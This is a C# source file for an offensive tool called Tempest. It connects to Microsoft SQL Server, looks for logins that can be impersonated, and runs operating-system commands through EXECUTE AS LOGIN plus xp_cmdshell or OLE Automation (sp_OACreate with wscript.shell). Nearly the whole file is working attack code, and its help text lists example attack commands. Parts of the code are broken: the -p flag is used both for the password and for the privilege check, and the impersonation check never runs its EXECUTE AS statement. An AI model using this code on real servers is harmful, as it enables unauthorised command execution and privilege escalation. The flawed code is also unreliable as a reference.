using System;
using System.Collections.Generic;
using System.Data.SqlClient;

namespace Tempest {
    internal class Program {
        static void printHelp() {
            Console.WriteLine("\nTempest | Your MSSQL Swiss Army Knife\n\nUsage:\n\n\t" +
                        "-h | Prints the help dialogue\n\t" +
                        "-s | Specify the server e.g. 'dc01.corp1.com'\n\t" +
                        "-d | Specify the database e.g. 'master' (used by default)\n\t" +
                        "-u | Specify the user to authenticate as\n\t" +
                        "-p | Specify the password of the user authenticating as\n\t" +
                        "-q | Specify the query to execute against the server\n\t" +
                        "-p | Check for privilege escalation vectors. Possible options: 'impersonation'\n\t" +
                        "-c | Execute a system command. Requires: '-i <USER TO EXEC AS>' and '-m <EXEC METHOD>' ('ole', 'xp_cmdshell') flags set\n\n" +
                        "Example Usage:\n\n" +
                        "\tUsing Standard Security (Username + Password)\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -u 'sa' -p 'letmein123!' -q 'SELECT SYSTEM_USER;'\n\n" +
                        "\tUsing Trusted Connection (Kerberos Authentication)\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -q 'SELECT SYSTEM_USER;'\n\n" +
                        "\tExecuting a system command\n\t.\\Tempest -s 'dc01.corp1.com' -i 'sa' -m 'xp_cmdshell' -c 'whoami'\n\n" +
                        "\tCheck for Privilege Escalation\n\t.\\Tempest -s 'dc01.corp1.com' -d 'master' -p 'impersonation'\n");
            Environment.Exit(0);
        }

        static void commandExec(SqlConnection con, string cmd, string execMethod, string executeAs)
        {
            try
            {
                if (execMethod == "xp_cmdshell")
                {
                    // Enable xp_cmdshell
                    string enableXPCMD = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE";
                    // Disable xp_cmdshell once command has executed
                    string disableXPCMD = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
                    string escalatePrivs = ("EXECUTE AS LOGIN = '" + executeAs + "';");
                    string executeCMD = ("EXEC xp_cmdshell '" + cmd + "';");

                    // Execyte as specified user
                    SqlCommand command = new SqlCommand(escalatePrivs, con);
                    SqlDataReader exec = command.ExecuteReader();
                    exec.Close();

                    // Enable xp_cmdshell
                    command = new SqlCommand(enableXPCMD, con);
                    exec = command.ExecuteReader();
                    exec.Close();

                    // Execute system command
                    Console.WriteLine("[+] Executing Command:");
                    command = new SqlCommand(executeCMD, con);
                    exec = command.ExecuteReader();

                    while (exec.Read())
                    {
                        Console.WriteLine(exec[0]);
                    }
                    exec.Close();

                    // Disable xp_cmdshell
                    command = new SqlCommand(disableXPCMD, con);
                    exec = command.ExecuteReader();
                    exec.Close();

                    con.Close();
                } else if (execMethod == "ole")
                {
                    // Enable OLE and invoke sp_OACreate and sp_OAMethod
                    string escalatePrivs = ("EXECUTE AS LOGIN = '" + executeAs + "';");
                    string enableOLE = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                    string disableOLE = "EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
                    string executeCMD = ("DECLARE @command INT; EXEC sp_oacreate 'wscript.shell', @command OUTPUT; EXEC sp_oamethod @command, 'run', null, 'cmd /c " + cmd + "';");

                    // Impersonate specified user
                    SqlCommand command = new SqlCommand(escalatePrivs, con);
                    SqlDataReader exec = command.ExecuteReader();
                    exec.Close();

                    // Enable OLE
                    command = new SqlCommand(enableOLE, con);
                    exec = command.ExecuteReader();
                    exec.Close();

                    // Execute user specified command
                    command = new SqlCommand(executeCMD, con);
                    exec = command.ExecuteReader();
                    Console.WriteLine("[*] Command Executed!");
                    exec.Close();

                    // Disable OLE
                    command = new SqlCommand(disableOLE, con);
                    exec = command.ExecuteReader();
                    exec.Close();

                    con.Close();
                }
            } catch
            {
                con.Close();
                Environment.Exit(0);
            }
        }

        static void privEscCheck(string typeOfPriv, SqlConnection con)
        {
            try
            {
                if (typeOfPriv == "impersonation")
                {
                    List<string> impersonatableUsers = new List<string>();
                    string sqlQuery = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
                    SqlCommand command = new SqlCommand(sqlQuery, con);
                    SqlDataReader exec = command.ExecuteReader();
                    if (exec.HasRows)
                    {
                        while (exec.Read())
                        {
                            impersonatableUsers.Add(exec[0].ToString());
                        }
                    } else
                    {
                        Console.WriteLine("[-] No Users Found to Impersonate. Exiting.");
                        con.Close();
                        Environment.Exit(0);
                    }
                    exec.Close();
                    string[] foundUserList = impersonatableUsers.ToArray();
                    foreach (string user in foundUserList)
                    {
                        string checkAsUser = "EXECUTE AS LOGIN = " + user + ";";
                        SqlCommand checkAsUserCommand = new SqlCommand(sqlQuery, con);
                        SqlDataReader execAsUser = command.ExecuteReader();
                        execAsUser.Read();
                        if (execAsUser[0].ToString() != "")
                        {
                            Console.WriteLine("[*] Found User: " + execAsUser[0]);
                            Console.WriteLine("      |--- Allows Impersonation: TRUE");
                        }
                        execAsUser.Close();
                    }
                    con.Close();
                    Environment.Exit(0);
                } else
                {
                    Console.WriteLine("[!] Error: '" + typeOfPriv + "' CHECK DOES NOT EXIST!");
                    con.Close();
                    Environment.Exit(0);
                }
            }
            catch (SqlException)
            {
                Console.WriteLine("[-] Error. Check your syntax");
                con.Close();
                Environment.Exit(0);
            }
        }

        static void execQuery(string sqlQuery, SqlConnection con)
        {
            try
            {
                SqlCommand command = new SqlCommand(sqlQuery, con);
                SqlDataReader exec = command.ExecuteReader();
                Console.WriteLine("[+] Query Output:");
                while (exec.Read()) 
                {
                    Console.WriteLine(exec[0]);
                }
                exec.Close();
                con.Close();
            } catch
            {
                con.Close();
                Environment.Exit(0);
            }
        }

        static SqlConnection connectDB(string sqlServer, string database, string sqlUser = "", string sqlPass = "") {
            string userRole = "";
            string conString = "";
            // Connect to the database
            if (sqlUser == "") {
                conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            }
            else {
                conString = "Server = " + sqlServer + "; Database = " + database + "; User Id = " + sqlUser + "; Password = " + sqlPass + ";";
            }

            SqlConnection con = new SqlConnection(conString);

            // Check the connection status
            try {
                con.Open();
                SqlCommand command = new SqlCommand("SELECT IS_SRVROLEMEMBER('public');", con);
                SqlDataReader exec = command.ExecuteReader();
                exec.Read();
                Int32 role = Int32.Parse(exec[0].ToString());
                if (role == 1) {
                    userRole = "public";
                }
                else {
                    userRole = "sysadmin";
                }
                Console.WriteLine("[+] Connection: SUCCESS | Server: " + sqlServer + " | User Role: " + userRole);
                exec.Close();
            }
            catch {
                Console.WriteLine("[!] Connection: FAILURE");
                con.Close();
                Environment.Exit(0);
            }
            return con;
        }

        static void Main(string[] args) {
            string sqlServer = "";
            string database = "master";
            string sqlUser = "";
            string sqlPass = "";
            string sqlQuery = "";
            string typeOfPriv = "";
            string command = "";
            string executeCommandAs = "";
            string execMethod = "";

            for (int i = 0; i < args.Length; i++) {
                if (args[i] == "-h" || args.Length == 0) {
                    printHelp();
                }
                if (args[i] == "-s") {
                    sqlServer = args[i + 1];
                }
                if (args[i] == "-d") {
                    database = args[i + 1];
                }
                if (args[i] == "-u") {
                    sqlUser = args[i + 1];
                }
                if (args[i] == "-p") {
                    sqlPass = args[i + 1];
                }
                if (args[i] == "-q") {
                    sqlQuery = args[i + 1];
                }
                if (args[i] == "-p")
                {
                    typeOfPriv = args[i + 1];
                }
                if (args[i] == "-c")
                {
                    command = args[i + 1];
                }
                if (args[i] == "-i")
                {
                    executeCommandAs = args[i + 1]; 
                }
                if (args[i] == "-m")
                {
                    execMethod = args[i + 1];
                }
            }

            // Connect to the database
            SqlConnection con = connectDB(sqlServer, database, sqlUser, sqlPass);

            // Execute a query against the server
            if (sqlQuery != "") {
                execQuery(sqlQuery, con);
            }

            if (typeOfPriv != "")
            {
                privEscCheck(typeOfPriv, con);
            }

            if (command != "")
            {
                commandExec(con, command, execMethod, executeCommandAs);
            } 

            con.Close();
            Environment.Exit(0);
        }
    }
}
